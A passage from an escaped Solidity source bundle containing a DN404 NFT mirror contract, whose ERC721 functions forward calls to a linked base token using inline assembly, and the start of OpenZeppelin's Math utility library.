=\\r\\n        0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925;\\r\\n\\r\\n    /// @dev `keccak256(bytes(\\\"ApprovalForAll(address,address,bool)\\\"))`.\\r\\n    uint256 private constant _APPROVAL_FOR_ALL_EVENT_SIGNATURE =\\r\\n        0x17307eab39ab6107e8899845ad3d59bd9653f200f220920489ca2b5937696c31;\\r\\n\\r\\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\\r\\n    /*                        CUSTOM ERRORS                       */\\r\\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\\r\\n\\r\\n    /// @dev Thrown when a call for an NFT function did not originate\\r\\n    /// from the base DN404 contract.\\r\\n    error SenderNotBase();\\r\\n\\r\\n    /// @dev Thrown when a call for an NFT function did not originate from the deployer.\\r\\n    error SenderNotDeployer();\\r\\n\\r\\n    /// @dev Thrown when transferring an NFT to a contract address that\\r\\n    /// does not implement ERC721Receiver.\\r\\n    error TransferToNonERC721ReceiverImplementer();\\r\\n\\r\\n    /// @dev Thrown when linking to the DN404 base contract and the\\r\\n    /// DN404 supportsInterface check fails or the call reverts.\\r\\n    error CannotLink();\\r\\n\\r\\n    /// @dev Thrown when a linkMirrorContract call is received and the\\r\\n    /// NFT mirror contract has already been linked to a DN404 base contract.\\r\\n    error AlreadyLinked();\\r\\n\\r\\n    /// @dev Thrown when retrieving the base DN404 address when a link has not\\r\\n    /// been established.\\r\\n    error NotLinked();\\r\\n\\r\\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\\r\\n    /*                          STORAGE                           */\\r\\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\\r\\n\\r\\n    /// @dev Struct contain the NFT mirror contract storage.\\r\\n    struct DN404NFTStorage {\\r\\n        address baseERC20;\\r\\n        address deployer;\\r\\n    }\\r\\n\\r\\n    /// @dev Returns a storage pointer for DN404NFTStorage.\\r\\n    function _getDN404NFTStorage()\\r\\n        internal\\r\\n        pure\\r\\n        virtual\\r\\n        returns (DN404NFTStorage storage $)\\r\\n    {\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            // `uint72(bytes9(keccak256(\\\"DN404_MIRROR_STORAGE\\\")))`.\\r\\n            $.slot := 0x3602298b8c10b01230 // Truncate to 9 bytes to reduce bytecode size.\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\\r\\n    /*                        CONSTRUCTOR                         */\\r\\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\\r\\n\\r\\n    constructor(address deployer) {\\r\\n        // For non-proxies, we will store the deployer so that only the deployer can\\r\\n        // link the base contract.\\r\\n        _getDN404NFTStorage().deployer = deployer;\\r\\n    }\\r\\n\\r\\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\\r\\n    /*                     ERC721 OPERATIONS                      */\\r\\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\\r\\n\\r\\n    /// @dev Returns the token collection name from the base DN404 contract.\\r\\n    function name() public view virtual returns (string memory result) {\\r\\n        address base = baseERC20();\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            result := mload(0x40)\\r\\n            mstore(0x00, 0x06fdde03) // `name()`.\\r\\n            if iszero(staticcall(gas(), base, 0x1c, 0x04, 0x00, 0x00)) {\\r\\n                returndatacopy(result, 0x00, returndatasize())\\r\\n                revert(result, returndatasize())\\r\\n            }\\r\\n            returndatacopy(0x00, 0x00, 0x20)\\r\\n            returndatacopy(result, mload(0x00), 0x20)\\r\\n            returndatacopy(\\r\\n                add(result, 0x20),\\r\\n                add(mload(0x00), 0x20),\\r\\n                mload(result)\\r\\n            )\\r\\n            mstore(0x40, add(add(result, 0x20), mload(result)))\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Returns the token collection symbol from the base DN404 contract.\\r\\n    function symbol() public view virtual returns (string memory result) {\\r\\n        address base = baseERC20();\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            result := mload(0x40)\\r\\n            mstore(0x00, 0x95d89b41) // `symbol()`.\\r\\n            if iszero(staticcall(gas(), base, 0x1c, 0x04, 0x00, 0x00)) {\\r\\n                returndatacopy(result, 0x00, returndatasize())\\r\\n                revert(result, returndatasize())\\r\\n            }\\r\\n            returndatacopy(0x00, 0x00, 0x20)\\r\\n            returndatacopy(result, mload(0x00), 0x20)\\r\\n            returndatacopy(\\r\\n                add(result, 0x20),\\r\\n                add(mload(0x00), 0x20),\\r\\n                mload(result)\\r\\n            )\\r\\n            mstore(0x40, add(add(result, 0x20), mload(result)))\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Returns the Uniform Resource Identifier (URI) for token `id` from\\r\\n    /// the base DN404 contract.\\r\\n    function tokenURI(\\r\\n        uint256 id\\r\\n    ) public view virtual returns (string memory result) {\\r\\n        address base = baseERC20();\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            result := mload(0x40)\\r\\n            mstore(0x20, id)\\r\\n            mstore(0x00, 0xc87b56dd) // `tokenURI()`.\\r\\n            if iszero(staticcall(gas(), base, 0x1c, 0x24, 0x00, 0x00)) {\\r\\n                returndatacopy(result, 0x00, returndatasize())\\r\\n                revert(result, returndatasize())\\r\\n            }\\r\\n            returndatacopy(0x00, 0x00, 0x20)\\r\\n            returndatacopy(result, mload(0x00), 0x20)\\r\\n            returndatacopy(\\r\\n                add(result, 0x20),\\r\\n                add(mload(0x00), 0x20),\\r\\n                mload(result)\\r\\n            )\\r\\n            mstore(0x40, add(add(result, 0x20), mload(result)))\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Returns the total NFT supply from the base DN404 contract.\\r\\n    function totalSupply() public view virtual returns (uint256 result) {\\r\\n        address base = baseERC20();\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            mstore(0x00, 0xe2c79281) // `totalNFTSupply()`.\\r\\n            if iszero(\\r\\n                and(\\r\\n                    gt(returndatasize(), 0x1f),\\r\\n                    staticcall(gas(), base, 0x1c, 0x04, 0x00, 0x20)\\r\\n                )\\r\\n            ) {\\r\\n                returndatacopy(mload(0x40), 0x00, returndatasize())\\r\\n                revert(mload(0x40), returndatasize())\\r\\n            }\\r\\n            result := mload(0x00)\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Returns the number of NFT tokens owned by `owner` from the base DN404 contract.\\r\\n    ///\\r\\n    /// Requirements:\\r\\n    /// - `owner` must not be the zero address.\\r\\n    function balanceOf(\\r\\n        address owner\\r\\n    ) public view virtual returns (uint256 result) {\\r\\n        address base = baseERC20();\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            mstore(0x20, shr(96, shl(96, owner)))\\r\\n            mstore(0x00, 0xf5b100ea) // `balanceOfNFT(address)`.\\r\\n            if iszero(\\r\\n                and(\\r\\n                    gt(returndatasize(), 0x1f),\\r\\n                    staticcall(gas(), base, 0x1c, 0x24, 0x00, 0x20)\\r\\n                )\\r\\n            ) {\\r\\n                returndatacopy(mload(0x40), 0x00, returndatasize())\\r\\n                revert(mload(0x40), returndatasize())\\r\\n            }\\r\\n            result := mload(0x00)\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Returns the owner of token `id` from the base DN404 contract.\\r\\n    ///\\r\\n    /// Requirements:\\r\\n    /// - Token `id` must exist.\\r\\n    function ownerOf(uint256 id) public view virtual returns (address result) {\\r\\n        address base = baseERC20();\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            mstore(0x00, 0x6352211e) // `ownerOf(uint256)`.\\r\\n            mstore(0x20, id)\\r\\n            if iszero(\\r\\n                and(\\r\\n                    gt(returndatasize(), 0x1f),\\r\\n                    staticcall(gas(), base, 0x1c, 0x24, 0x00, 0x20)\\r\\n                )\\r\\n            ) {\\r\\n                returndatacopy(mload(0x40), 0x00, returndatasize())\\r\\n                revert(mload(0x40), returndatasize())\\r\\n            }\\r\\n            result := shr(96, mload(0x0c))\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Sets `spender` as the approved account to manage token `id` in\\r\\n    /// the base DN404 contract.\\r\\n    ///\\r\\n    /// Requirements:\\r\\n    /// - Token `id` must exist.\\r\\n    /// - The caller must be the owner of the token,\\r\\n    ///   or an approved operator for the token owner.\\r\\n    ///\\r\\n    /// Emits an {Approval} event.\\r\\n    function approve(address spender, uint256 id) public virtual {\\r\\n        address base = baseERC20();\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            spender := shr(96, shl(96, spender))\\r\\n            let m := mload(0x40)\\r\\n            mstore(0x00, 0xd10b6e0c) // `approveNFT(address,uint256,address)`.\\r\\n            mstore(0x20, spender)\\r\\n            mstore(0x40, id)\\r\\n            mstore(0x60, caller())\\r\\n            if iszero(\\r\\n                and(\\r\\n                    gt(returndatasize(), 0x1f),\\r\\n                    call(gas(), base, callvalue(), 0x1c, 0x64, 0x00, 0x20)\\r\\n                )\\r\\n            ) {\\r\\n                returndatacopy(m, 0x00, returndatasize())\\r\\n                revert(m, returndatasize())\\r\\n            }\\r\\n            mstore(0x40, m) // Restore the free memory pointer.\\r\\n            mstore(0x60, 0) // Restore the zero pointer.\\r\\n            // Emit the {Approval} event.\\r\\n            log4(\\r\\n                codesize(),\\r\\n                0x00,\\r\\n                _APPROVAL_EVENT_SIGNATURE,\\r\\n                shr(96, mload(0x0c)),\\r\\n                spender,\\r\\n                id\\r\\n            )\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Returns the account approved to manage token `id` from\\r\\n    /// the base DN404 contract.\\r\\n    ///\\r\\n    /// Requirements:\\r\\n    /// - Token `id` must exist.\\r\\n    function getApproved(\\r\\n        uint256 id\\r\\n    ) public view virtual returns (address result) {\\r\\n        address base = baseERC20();\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            mstore(0x00, 0x081812fc) // `getApproved(uint256)`.\\r\\n            mstore(0x20, id)\\r\\n            if iszero(\\r\\n                and(\\r\\n                    gt(returndatasize(), 0x1f),\\r\\n                    staticcall(gas(), base, 0x1c, 0x24, 0x00, 0x20)\\r\\n                )\\r\\n            ) {\\r\\n                returndatacopy(mload(0x40), 0x00, returndatasize())\\r\\n                revert(mload(0x40), returndatasize())\\r\\n            }\\r\\n            result := shr(96, mload(0x0c))\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Sets whether `operator` is approved to manage the tokens of the caller in\\r\\n    /// the base DN404 contract.\\r\\n    ///\\r\\n    /// Emits an {ApprovalForAll} event.\\r\\n    function setApprovalForAll(address operator, bool approved) public virtual {\\r\\n        address base = baseERC20();\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            operator := shr(96, shl(96, operator))\\r\\n            let m := mload(0x40)\\r\\n            mstore(0x00, 0x813500fc) // `setApprovalForAll(address,bool,address)`.\\r\\n            mstore(0x20, operator)\\r\\n            mstore(0x40, iszero(iszero(approved)))\\r\\n            mstore(0x60, caller())\\r\\n            if iszero(\\r\\n                and(\\r\\n                    eq(mload(0x00), 1),\\r\\n                    call(gas(), base, callvalue(), 0x1c, 0x64, 0x00, 0x20)\\r\\n                )\\r\\n            ) {\\r\\n                returndatacopy(m, 0x00, returndatasize())\\r\\n                revert(m, returndatasize())\\r\\n            }\\r\\n            // Emit the {ApprovalForAll} event.\\r\\n            log3(\\r\\n                0x40,\\r\\n                0x20,\\r\\n                _APPROVAL_FOR_ALL_EVENT_SIGNATURE,\\r\\n                caller(),\\r\\n                operator\\r\\n            )\\r\\n            mstore(0x40, m) // Restore the free memory pointer.\\r\\n            mstore(0x60, 0) // Restore the zero pointer.\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Returns whether `operator` is approved to manage the tokens of `owner` from\\r\\n    /// the base DN404 contract.\\r\\n    function isApprovedForAll(\\r\\n        address owner,\\r\\n        address operator\\r\\n    ) public view virtual returns (bool result) {\\r\\n        address base = baseERC20();\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            let m := mload(0x40)\\r\\n            mstore(0x40, operator)\\r\\n            mstore(0x2c, shl(96, owner))\\r\\n            mstore(0x0c, 0xe985e9c5000000000000000000000000) // `isApprovedForAll(address,address)`.\\r\\n            if iszero(\\r\\n                and(\\r\\n                    gt(returndatasize(), 0x1f),\\r\\n                    staticcall(gas(), base, 0x1c, 0x44, 0x00, 0x20)\\r\\n                )\\r\\n            ) {\\r\\n                returndatacopy(m, 0x00, returndatasize())\\r\\n                revert(m, returndatasize())\\r\\n            }\\r\\n            mstore(0x40, m) // Restore the free memory pointer.\\r\\n            result := iszero(iszero(mload(0x00)))\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Transfers token `id` from `from` to `to`.\\r\\n    ///\\r\\n    /// Requirements:\\r\\n    ///\\r\\n    /// - Token `id` must exist.\\r\\n    /// - `from` must be the owner of the token.\\r\\n    /// - `to` cannot be the zero address.\\r\\n    /// - The caller must be the owner of the token, or be approved to manage the token.\\r\\n    ///\\r\\n    /// Emits a {Transfer} event.\\r\\n    function transferFrom(address from, address to, uint256 id) public virtual {\\r\\n        address base = baseERC20();\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            from := shr(96, shl(96, from))\\r\\n            to := shr(96, shl(96, to))\\r\\n            let m := mload(0x40)\\r\\n            mstore(m, 0xe5eb36c8) // `transferFromNFT(address,address,uint256,address)`.\\r\\n            mstore(add(m, 0x20), from)\\r\\n            mstore(add(m, 0x40), to)\\r\\n            mstore(add(m, 0x60), id)\\r\\n            mstore(add(m, 0x80), caller())\\r\\n            if iszero(\\r\\n                and(\\r\\n                    eq(mload(m), 1),\\r\\n                    call(gas(), base, callvalue(), add(m, 0x1c), 0x84, m, 0x20)\\r\\n                )\\r\\n            ) {\\r\\n                returndatacopy(m, 0x00, returndatasize())\\r\\n                revert(m, returndatasize())\\r\\n            }\\r\\n            // Emit the {Transfer} event.\\r\\n            log4(codesize(), 0x00, _TRANSFER_EVENT_SIGNATURE, from, to, id)\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Equivalent to `safeTransferFrom(from, to, id, \\\"\\\")`.\\r\\n    function safeTransferFrom(\\r\\n        address from,\\r\\n        address to,\\r\\n        uint256 id\\r\\n    ) public payable virtual {\\r\\n        transferFrom(from, to, id);\\r\\n\\r\\n        if (_hasCode(to)) _checkOnERC721Received(from, to, id, \\\"\\\");\\r\\n    }\\r\\n\\r\\n    /// @dev Transfers token `id` from `from` to `to`.\\r\\n    ///\\r\\n    /// Requirements:\\r\\n    ///\\r\\n    /// - Token `id` must exist.\\r\\n    /// - `from` must be the owner of the token.\\r\\n    /// - `to` cannot be the zero address.\\r\\n    /// - The caller must be the owner of the token, or be approved to manage the token.\\r\\n    /// - If `to` refers to a smart contract, it must implement\\r\\n    ///   {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\\r\\n    ///\\r\\n    /// Emits a {Transfer} event.\\r\\n    function safeTransferFrom(\\r\\n        address from,\\r\\n        address to,\\r\\n        uint256 id,\\r\\n        bytes calldata data\\r\\n    ) public virtual {\\r\\n        transferFrom(from, to, id);\\r\\n\\r\\n        if (_hasCode(to)) _checkOnERC721Received(from, to, id, data);\\r\\n    }\\r\\n\\r\\n    /// @dev Returns true if this contract implements the interface defined by `interfaceId`.\\r\\n    /// See: https://eips.ethereum.org/EIPS/eip-165\\r\\n    /// This function call must use less than 30000 gas.\\r\\n    function supportsInterface(\\r\\n        bytes4 interfaceId\\r\\n    ) public view virtual returns (bool result) {\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            let s := shr(224, interfaceId)\\r\\n            // ERC165: 0x01ffc9a7, ERC721: 0x80ac58cd, ERC721Metadata: 0x5b5e139f.\\r\\n            result := or(\\r\\n                or(eq(s, 0x01ffc9a7), eq(s, 0x80ac58cd)),\\r\\n                eq(s, 0x5b5e139f)\\r\\n            )\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\\r\\n    /*                     MIRROR OPERATIONS                      */\\r\\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\\r\\n\\r\\n    /// @dev Returns the address of the base DN404 contract.\\r\\n    function baseERC20() public view virtual returns (address base) {\\r\\n        base = _getDN404NFTStorage().baseERC20;\\r\\n        if (base == address(0)) revert NotLinked();\\r\\n    }\\r\\n\\r\\n    /// @dev Fallback modifier to execute calls from the base DN404 contract.\\r\\n    modifier dn404NFTFallback() virtual {\\r\\n        DN404NFTStorage storage $ = _getDN404NFTStorage();\\r\\n\\r\\n        uint256 fnSelector = _calldataload(0x00) \\u003e\\u003e 224;\\r\\n\\r\\n        // `logTransfer(uint256[])`.\\r\\n        if (fnSelector == 0x263c69d6) {\\r\\n            if (msg.sender != $.baseERC20) revert SenderNotBase();\\r\\n            /// @solidity memory-safe-assembly\\r\\n            assembly {\\r\\n                // When returndatacopy copies 1 or more out-of-bounds bytes, it reverts.\\r\\n                returndatacopy(0x00, returndatasize(), lt(calldatasize(), 0x20))\\r\\n                let o := add(0x24, calldataload(0x04)) // Packed logs offset.\\r\\n                returndatacopy(0x00, returndatasize(), lt(calldatasize(), o))\\r\\n                let end := add(o, shl(5, calldataload(sub(o, 0x20))))\\r\\n                returndatacopy(0x00, returndatasize(), lt(calldatasize(), end))\\r\\n\\r\\n                for {\\r\\n\\r\\n                } iszero(eq(o, end)) {\\r\\n                    o := add(0x20, o)\\r\\n                } {\\r\\n                    let d := calldataload(o) // Entry in the packed logs.\\r\\n                    let a := shr(96, d) // The address.\\r\\n                    let b := and(1, d) // Whether it is a burn.\\r\\n                    log4(\\r\\n                        codesize(),\\r\\n                        0x00,\\r\\n                        _TRANSFER_EVENT_SIGNATURE,\\r\\n                        mul(a, b),\\r\\n                        mul(a, iszero(b)),\\r\\n                        shr(168, shl(160, d))\\r\\n                    )\\r\\n                }\\r\\n                mstore(0x00, 0x01)\\r\\n                return(0x00, 0x20)\\r\\n            }\\r\\n        }\\r\\n        // `linkMirrorContract(address)`.\\r\\n        if (fnSelector == 0x0f4599e5) {\\r\\n            if ($.deployer != address(0)) {\\r\\n                if (address(uint160(_calldataload(0x04))) != $.deployer) {\\r\\n                    revert SenderNotDeployer();\\r\\n                }\\r\\n            }\\r\\n            if ($.baseERC20 != address(0)) revert AlreadyLinked();\\r\\n            $.baseERC20 = msg.sender;\\r\\n            /// @solidity memory-safe-assembly\\r\\n            assembly {\\r\\n                mstore(0x00, 0x01)\\r\\n                return(0x00, 0x20)\\r\\n            }\\r\\n        }\\r\\n        _;\\r\\n    }\\r\\n\\r\\n    /// @dev Fallback function for calls from base DN404 contract.\\r\\n    fallback() external payable virtual dn404NFTFallback {}\\r\\n\\r\\n    receive() external payable virtual {}\\r\\n\\r\\n    /*\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-\u00ab-*/\\r\\n    /*                      PRIVATE HELPERS                       */\\r\\n    /*-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb-\u00bb*/\\r\\n\\r\\n    /// @dev Returns the calldata value at `offset`.\\r\\n    function _calldataload(\\r\\n        uint256 offset\\r\\n    ) private pure returns (uint256 value) {\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            value := calldataload(offset)\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Returns if `a` has bytecode of non-zero length.\\r\\n    function _hasCode(address a) private view returns (bool result) {\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            result := extcodesize(a) // Can handle dirty upper bits.\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /// @dev Perform a call to invoke {IERC721Receiver-onERC721Received} on `to`.\\r\\n    /// Reverts if the target does not support the function correctly.\\r\\n    function _checkOnERC721Received(\\r\\n        address from,\\r\\n        address to,\\r\\n        uint256 id,\\r\\n        bytes memory data\\r\\n    ) private {\\r\\n        /// @solidity memory-safe-assembly\\r\\n        assembly {\\r\\n            // Prepare the calldata.\\r\\n            let m := mload(0x40)\\r\\n            let onERC721ReceivedSelector := 0x150b7a02\\r\\n            mstore(m, onERC721ReceivedSelector)\\r\\n            mstore(add(m, 0x20), caller()) // The `operator`, which is always `msg.sender`.\\r\\n            mstore(add(m, 0x40), shr(96, shl(96, from)))\\r\\n            mstore(add(m, 0x60), id)\\r\\n            mstore(add(m, 0x80), 0x80)\\r\\n            let n := mload(data)\\r\\n            mstore(add(m, 0xa0), n)\\r\\n            if n {\\r\\n                pop(staticcall(gas(), 4, add(data, 0x20), n, add(m, 0xc0), n))\\r\\n            }\\r\\n            // Revert if the call reverts.\\r\\n            if iszero(call(gas(), to, 0, add(m, 0x1c), add(n, 0xa4), m, 0x20)) {\\r\\n                if returndatasize() {\\r\\n                    // Bubble up the revert if the call reverts.\\r\\n                    returndatacopy(m, 0x00, returndatasize())\\r\\n                    revert(m, returndatasize())\\r\\n                }\\r\\n            }\\r\\n            // Load the returndata and compare it.\\r\\n            if iszero(eq(mload(m), shl(224, onERC721ReceivedSelector))) {\\r\\n                mstore(0x00, 0xd1a57ed6) // `TransferToNonERC721ReceiverImplementer()`.\\r\\n                revert(0x1c, 0x04)\\r\\n            }\\r\\n        }\\r\\n    }\\r\\n}\"},\"Math.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\n// OpenZeppelin Contracts (last updated v5.0.0) (utils/math/Math.sol)\\r\\n\\r\\npragma solidity ^0.8.20;\\r\\n\\r\\n/**\\r\\n * @dev Standard math utilities missing in the Solidity language.\\r\\n */\\r\\nlibrary Math {\\r\\n    /**\\r\\n     * @dev Muldiv operation overflow.\\r\\n     */\\r\\n    error MathOverflowedMulDiv();\\r\\n\\r\\n    enum Rounding {\\r\\n        Floor, // Toward negative infinity\\r\\n        Ceil, // Toward positive infinity\\r\\n        Trunc, // Toward zero\\r\\n        Expand // Away from zero\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the addition of two unsigned integers, with an overflow flag.\\r\\n     */\\r\\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\r\\n        unchecked {\\r\\n            uint256 c = a + b;\\r\\n            if (c \\u003c a) return (false, 0);\\r\\n            return (true, c);\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.\\r\\n     */\\r\\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\r\\n        unchecked {\\r\\n            if (b \\u003e a) return (false, 0);\\r\\n            return (true, a - b);\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.\\r\\n     */\\r\\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\r\\n        unchecked {\\r\\n            // Gas optimization: this is cheaper than requiring \\u0027a\\u0027 not being zero, but the\\r\\n            // benefit is lost if \\u0027b\\u0027 is also tested.\\r\\n            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\\r\\n            if (a == 0) return (true, 0);\\r\\n            uint256 c = a * b;\\r\\n            if (c / a != b) return (false, 0);\\r\\n            return (true, c);\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the division of two unsigned integers, with a division by zero flag.\\r\\n     */\\r\\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\r\\n        unchecked {\\r\\n            if (b == 0) return (false, 0);\\r\\n            return (true, a / b);\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.\\r\\n     */\\r\\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\r\\n        unchecked {\\r\\n            if (b == 0) return (false, 0);\\r\\n            return (true, a % b);\\r\\n        }\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the largest of two numbers.\\r\\n     */\\r\\n    function max(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return a \\u003e b ? a : b;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the smallest of two numbers.\\r\\n     */\\r\\n    function min(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return a \\u003c b ? a : b;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the average of two numbers. The result is rounded towards\\r\\n     * zero.\\r\\n     */\\r\\n    function average(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        // (a + b) / 2 can overflow.\\r\\n        return (a \\u0026 b) + (a ^ b) / 2;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the ceiling of the division of two numbers.\\r\\n     *\\r\\n     * This differs from standard division with `/` in that it rounds towards infinity instead\\r\\n     * of rounding towards zero.\\r\\n     */\\r\\n    function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        if (b == 0) {\\r\\n            // Guarantee the same behavior as in a regular Solidity division.\\r\\n            return a / b;\\r\\n        }\\r\\n\\r\\n        // (a + b - 1) / b can overflow on addition, so we distribute.\\r\\n        return a == 0 ? 0 : (a - 1) / b + 1;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @notice Calculates floor(x * y / denominator) with full precision. Throws if result overflows a uint256 or\\r\\n     * denominator == 0.\\r\\n     * @dev Original credit to Remco Bloemen under MIT license (https://xn--2-umb.com/21/muldiv) with further edits by\\r\\n     * Uniswap Labs also under MIT license.\\r\\n     */\\r\\n    function mulDiv(uint256 x, uint256 y, uint256 denominator) internal pure returns (uint256 result) {\\r\\n        unchecked {\\r\\n            // 512-bit multiply [prod1 prod0] = x * y. Compute the product mod 2^256 and mod 2^256 - 1, then use\\r\\n            // use the Chinese Remainder Theorem to reconstruct the 512 bit result. The result is stored in two 256\\r\\n            // variables such that product = prod1 * 2^256 + prod0.\\r\\n            uint256 prod0 = x * y; // Least significant 256 bits of the 